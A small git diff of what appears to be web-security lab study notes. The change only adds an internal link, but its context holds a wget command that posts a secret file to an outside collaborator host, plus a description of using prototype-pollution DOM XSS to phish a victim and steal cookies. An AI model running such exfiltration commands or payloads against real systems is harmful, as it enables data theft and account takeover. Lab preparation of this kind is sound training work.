@@ -867,7 +867,7 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 
 ## ProtoType Pollution  
 
->A target is vulnerable to DOM XSS via client side prototype pollution. **DOM Invader** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
+>A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
 
 <sub>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL</sub>
 
